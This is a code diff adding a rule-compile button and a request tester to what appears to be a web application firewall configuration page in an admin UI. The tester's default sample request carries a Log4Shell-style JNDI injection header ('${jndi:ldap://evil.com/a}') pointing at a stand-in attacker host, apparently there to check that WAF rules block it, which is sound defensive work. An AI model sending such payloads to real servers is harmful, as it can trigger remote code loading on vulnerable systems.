@@ -1,4 +1,115 @@
 
+class CompileButton extends Component {
+
+  state = { error: null, msg: ' Compile' };
+
+  compile = () => {
+    fetch('/extensions/cloud-apim/extensions/waf/utils/_compile', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {
+        Accept: 'application/json',
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify(this.props.rawValue)
+    }).then(r => r.json()).then(r => {
+      if (r.error) {
+        this.setState({ error: r.error });
+      } else {
+        this.setState({ error: null, msg: ' Compilation successful !' });
+        setTimeout(() => {
+          this.setState({ msg: ' Compile' });
+        }, 3000)
+      }
+    })
+  }
+
+  render() {
+    return [
+      React.createElement('div', { className: 'row mb-3' },
+        React.createElement('label', { className: 'col-xs-12 col-sm-2 col-form-label' }, ''),
+        React.createElement('div', { className: 'col-sm-10', style: { display: 'flex' } },
+          React.createElement('button', {
+            className: 'btn btn-sm btn-success',
+            type: 'button',
+            onClick: (e) => this.compile(),
+          },  React.createElement('i', { className: 'fas fa-microchip' }, null), this.state.msg)
+        )
+      ),
+      this.state.error && React.createElement('div', { className: 'row mb-3' },
+        React.createElement('label', { className: 'col-xs-12 col-sm-2 col-form-label' }, ''),
+        React.createElement('div', {className: 'col-sm-10', style: {display: 'flex'}},
+          React.createElement('div', {className: 'alert alert-danger', role: 'alert' }, this.state.error)
+        )
+      ),
+    ]
+  }
+}
+
+class WafConfigTester extends Component {
+  state = {
+    calling: false,
+    result: null,
+    error: null,
+    input: JSON.stringify({
+      method: 'POST',
+      uri: '/post',
+      headers: {
+        apikey: "${jndi:ldap://evil.com/a}",
+        "content-length": "7",
+        "host": "www.foo.bar",
+        "content-type": "application/x-www-form-urlencoded",
+        "user-agent": "curl/8.1.2",
+        "accept": "*/*",
+      },
+      cookies: { foo: "bar" },
+      query: { foo: "bar" },
+      body: "foo=bar",
+      protocol: "HTTP/1.1",
+      status: null,
+    }, null, 2),
+  }
+
+  send = () => {
+    this.setState({ calling: true, result: null, error: null });
+    fetch('/extensions/cloud-apim/extensions/waf/utils/_test', {
+      method: 'POST',
+      credentials: 'include',
+      headers: {
+        Accept: 'application/json',
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ ...this.props.rawValue, request: JSON.parse(this.state.input) })
+    }).then(r => r.json()).then(r => {
+      this.setState({ calling: false, result: JSON.stringify(r, null, 2), error: null });
+    }).catch(ex => {
+      this.setState({ calling: false, result: null, error: ex });
+    })
+  }
+
+  render() {
+    return [
+      React.createElement('div', { className: 'row mb-3' },
+        React.createElement('label', { className: 'col-xs-12 col-sm-2 col-form-label' }, ''),
+        React.createElement('div', { className: 'col-sm-10', style: { display: 'flex' } },
+          React.createElement('div', { style: { display: 'flex', width: '100%', flexDirection: 'column' }},
+            React.createElement('textarea', { className: 'form-control', rows: 21, value: this.state.input, onChange: (e) => this.setState({ input: e.target.value }) }),
+            React.createElement('div', { style: { display: 'flex', width: '100%', flexDirection: 'row', justifyContent: 'flex-end', padding: 10 } },
+              React.createElement('button', { type: 'button', className: 'btn btn-sm btn-success', onClick: this.send, disabled: this.state.calling },
+                React.createElement('i', { className: 'fas fa-play' }),
+                React.createElement('span', null, ' Test'),
+              ),
+            ),
+            this.state.result && React.createElement('div', { },
+              React.createElement('textarea', { rows: 15, className: 'form-control', value: this.state.result }, ''),
+            )
+          )
+        )
+      )
+    ];
+  }
+}
+
 class WafConfigsPage extends Component {
 
   formSchema = {
@@ -59,6 +170,14 @@ class WafConfigsPage extends Component {
       type: 'array',
       props: { label: 'Rules', placeholder: 'WAF rules to apply' },
     },
+    compile: {
+      type: CompileButton,
+      props: {}
+    },
+    test: {
+      type: WafConfigTester,
+      props: {}
+    }
   };
 
   columns = [
@@ -101,6 +220,9 @@ class WafConfigsPage extends Component {
     'output_body_mimetypes',
     '<<<Rules',
     'rules',
+    'compile',
+    '>>>Test',
+    'test'
   ];
 
   componentDidMount() {
